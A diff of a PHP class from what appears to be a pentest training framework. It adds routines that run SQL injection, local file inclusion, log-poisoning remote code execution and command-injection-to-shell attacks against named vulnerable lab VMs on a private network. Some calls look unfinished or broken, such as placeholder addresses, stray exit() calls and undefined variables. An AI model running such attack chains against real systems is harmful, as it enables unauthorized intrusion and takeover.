@@ -33,7 +33,13 @@ class poc4web extends poc4service{
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
         
-        $ip = "10.60.10.185"; // BSides-Vancouver-2018-Workshop
+        $ip = "10.60.10.137"; // DC1  exploit/unix/webapp/drupal_drupalgeddon2
+        $port = "80";
+        $web = "http://$ip:$port/";
+        $this->poc4web($eth,$domain,$web,$fonction2exec);
+        
+        
+        $ip = "10.60.10.185"; // BSides-Vancouver-2018-Workshop 
         $port = "80";
         $web = "http://$ip:$port/backup_wordpress/";
         $this->poc4web($eth,$domain,$web,$fonction2exec);
@@ -55,7 +61,95 @@ class poc4web extends poc4service{
         $this->poc4web($eth,$domain,$web,$fonction2exec);
     }
     
+    public function poc4web4sqli2enumuser2ssh(){
+        $this->titre(__FUNCTION__);
+        
+        
+        $ip = "10.60.10.0"; // VulnOS2
+        $port = "80";
+        $url = "http://$ip:$port/jaabcd0cs/ajax_udf.php?q=1&add_value=odm_user";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"add_value","odm_user","GET");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->sqli4pentest()($OS);
+    }
+    public function poc4web4sqli2enumuser2root(){
+        $this->titre(__FUNCTION__);
+        
+        
+        $ip = "10.60.10.0"; // libraray1
+        $port = "80";
+        $url = "http://$ip:$port/library.php?country=Netherlands";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"country","Netherlands","POST");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->sqli4pentest()($OS);
+    }
+    public function poc4web4lfi2enumuser2ssh(){
+        $this->titre(__FUNCTION__);
+        
+        
+        $ip = "10.60.10.0"; // Wakanda1 
+        $port = "80";
+        $url = "http://$ip:$port/index.php?lang=fr";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"lang","fr","GET");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->fi4pentest($OS);
+
+        $ip = "10.60.10.161"; // W1R3S
+        $port = "80";
+        $url = "http://$ip:$port/administrator/alerts/alertConfigField.php?urlConfig=index.php";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"urlConfig","index.php","POST");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->fi4pentest($OS);
+    }
     
+    public function poc4web4lfi2rce8log4smtp(){
+        $this->titre(__FUNCTION__);
+        
+        
+        $ip = "10.60.10.0"; // WinterMute One
+        $port = "80";
+        $url = "http://$ip:$port/turing-bolo/bolo.php?bolo=case";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"bolo","case","GET");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->fi4pentest($OS);
+        $url_fi->fi2log4smtp($cmd, $filter);
+        
+    }
     public function poc4web4rfi(){
         $msf = "10.60.10.130";
 
@@ -309,7 +403,69 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $this->ssTitre(__FUNCTION__);
         $this->flag_poc = TRUE ;
         //$this->flag_poc = FALSE ;
+        $ip = "10.60.10.0"; // ted1
+        $port = 80 ;
         
+        
+        $param = "search";
+        $value = "index.php";
+        $uri = "home.php?$param=$value";
+        
+        $methode_http = "POST";
+        $url = "http://$ip:$port/$uri";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $OS = "linux";
+        
+        
+        
+        $stream = "";
+        $url_ce = new PARAM($stream,$eth,$domain,$url,$param,$value,$methode_http);
+        $url_ce->poc($this->flag_poc);
+        $url_ce->ce2shell8param($OS);
+        exit();
+        
+        $ip = "10.60.10.0"; // temple of doom
+        $port = 666 ;
+        
+        $uri = "index.php?profile=ldfhjgdlkjhehfsf";
+        $param = "profile";
+        $value = "ldfhjgdlkjhehfsf";
+        
+        $methode_http = "POST";
+        $url = "http://$ip:$port/$uri";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $OS = "linux";
+        
+        
+        
+        $stream = "";
+        $url_ce = new PARAM($stream,$eth,$domain,$url,$param,$value,$methode_http);
+        $url_ce->poc($this->flag_poc);
+        $url_ce->ce2shell8param($OS);
+        exit();
+        
+        $ip = "10.60.10.0"; // Nightmare 
+        $port = 60080 ;
+        
+        $uri = "index.php?page=mailer&mail=pwd";
+        $param = "mail";
+        $value = "pwd";
+        
+        $methode_http = "GET";
+        $url = "http://$ip:$port/$uri";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $OS = "linux";
+        
+        
+        
+        $stream = "";
+        $url_ce = new PARAM($stream,$eth,$domain,$url,$param,$value,$methode_http);
+        $url_ce->poc($this->flag_poc);
+        $url_ce->ce2shell8param($OS);
+        exit();
         
         $ip = "10.60.10.181"; // Basilic
         $port = 33447 ;
@@ -414,7 +570,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2rfi($cmd, $filter);
     }
     
-    public function poc4web2shell8param2lfi2log4webserver(){ // OK msf
+    public function poc4web2shell8param2lfi2rce8log4webserver(){ // OK msf
         $this->ssTitre(__FUNCTION__);
         $this->flag_poc = TRUE ;
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
@@ -450,9 +606,26 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
     }
     
     
-    public function poc4web2shell8param2lfi2log4ssh(){ // OK msf
+    public function poc4web2shell8param2lfi2rce8log4ssh(){ // OK msf
         $this->ssTitre(__FUNCTION__);
         
+        
+        
+        $ip = "10.60.10.0"; // the ether EvilScience
+        $port = "80";
+        $url = "http://$ip:$port/index.php?file=about.php";
+        $OS = "linux";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $stream = "";
+        $url_fi = new URL($stream,$url);
+        $url_fi->poc($this->flag_poc);
+        $url_fi->url4pentest();
+        $url_fi = new PARAM($stream,$url,"file","about.php","GET");
+        $url_fi->poc($this->flag_poc);
+        $url_fi->sqli4pentest()($OS);
+        
+        exit();
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
         $url = "http://$this->msf2:80/$uri";
@@ -484,7 +657,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
     }
     
     
-    public function poc4web2shell8param2lfi2log(){ //
+    public function poc4web2shell8param2lfi2rce8log(){ //
         $this->ssTitre(__FUNCTION__);
         $query = "for i in $(locate .log | grep -v '.gz' | grep '.log$'); do ls -al \$i;done " ;
         $this->requette($query);
@@ -498,21 +671,21 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         
         
         
-        $this->poc4web2shell8param2lfi2log4smtp();$this->pause(); // OK
-        $this->poc4web2shell8param2lfi2log4ssh();$this->pause();    // OK 
-        $this->poc4web2shell8param2lfi2log4ftp();$this->pause();    // OK
-        $this->poc4web2shell8param2lfi2log4webserver();$this->pause(); // OK
-        $this->poc4web2shell8param2lfi2log4useragent();$this->pause(); // OK         
+        $this->poc4web2shell8param2lfi2rce8log4smtp();$this->pause(); // OK
+        $this->poc4web2shell8param2lfi2rce8log4ssh();$this->pause();    // OK 
+        $this->poc4web2shell8param2lfi2rce8log4ftp();$this->pause();    // OK
+        $this->poc4web2shell8param2lfi2rce8log4webserver();$this->pause(); // OK
+        $this->poc4web2shell8param2lfi2rce8log4useragent();$this->pause(); // OK         
         
-        $this->poc4web2shell8param2lfi2log4mysql();$this->pause();    // Later
-        $this->poc4web2shell8param2lfi2log4mongodb();$this->pause(); // Later
-        $this->poc4web2shell8param2lfi2log4postgresql();$this->pause(); // Later
-        $this->poc4web2shell8param2lfi2log4fd();$this->pause(); // No        
-        $this->poc4web2shell8param2lfi2log4telnet();$this->pause(); // Later
-        $this->poc4web2shell8param2lfi2log4session();$this->pause(); // Later
+        $this->poc4web2shell8param2lfi2rce8log4mysql();$this->pause();    // Later
+        $this->poc4web2shell8param2lfi2rce8log4mongodb();$this->pause(); // Later
+        $this->poc4web2shell8param2lfi2rce8log4postgresql();$this->pause(); // Later
+        $this->poc4web2shell8param2lfi2rce8log4fd();$this->pause(); // No        
+        $this->poc4web2shell8param2lfi2rce8log4telnet();$this->pause(); // Later
+        $this->poc4web2shell8param2lfi2rce8log4session();$this->pause(); // Later
     }
     
-    public function poc4web2shell8param2lfi2log4mysql(){ //
+    public function poc4web2shell8param2lfi2rce8log4mysql(){ //
         $this->ssTitre(__FUNCTION__);
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
@@ -553,7 +726,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2log4db4mysql($cmd, $filter);$this->pause();
     }
     
-    public function poc4web2shell8param2lfi2log4mongodb(){ //
+    public function poc4web2shell8param2lfi2rce8log4mongodb(){ //
         $this->ssTitre(__FUNCTION__);
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
@@ -585,7 +758,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2log4db4mongodb($cmd, $filter);$this->pause();
     }
     
-    public function poc4web2shell8param2lfi2log4postgresql(){ //
+    public function poc4web2shell8param2lfi2rce8log4postgresql(){ //
         $this->ssTitre(__FUNCTION__);
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
@@ -617,7 +790,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2log4db4postgresql($cmd, $filter);$this->pause();
     }
     
-    public function poc4web2shell8param2lfi2log4session(){ //
+    public function poc4web2shell8param2lfi2rce8log4session(){ //
         $this->ssTitre(__FUNCTION__);       
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         $url = "http://$this->msf2:80/$uri";
@@ -657,7 +830,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2log4session($cmd, $filter);$this->pause();
     }
     
-    public function poc4web2shell8param2lfi2log4fd(){ //
+    public function poc4web2shell8param2lfi2rce8log4fd(){ //
         $this->ssTitre(__FUNCTION__);
         
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
@@ -740,7 +913,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         
     }
     
-    public function poc4web2shell8param2lfi2log4ftp(){ // OK
+    public function poc4web2shell8param2lfi2rce8log4ftp(){ // OK
         $this->ssTitre(__FUNCTION__);
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
@@ -773,7 +946,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         $url_fi->fi2log4ftp($cmd, $filter);$this->pause();
     }
     
-    public function poc4web2shell8param2lfi2log4useragent(){ //
+    public function poc4web2shell8param2lfi2rce8log4useragent(){ //
         $this->ssTitre(__FUNCTION__);
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
@@ -806,11 +979,11 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
         
     }
     
-    public function poc4web2shell8param2lfi2log4telnet(){ //
+    public function poc4web2shell8param2lfi2rce8log4telnet(){ //
         $this->ssTitre(__FUNCTION__);
     }
     
-    public function poc4web2shell8param2lfi2log4smtp(){ // 
+    public function poc4web2shell8param2lfi2rce8log4smtp(){ // 
         $this->ssTitre(__FUNCTION__);
         
         $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
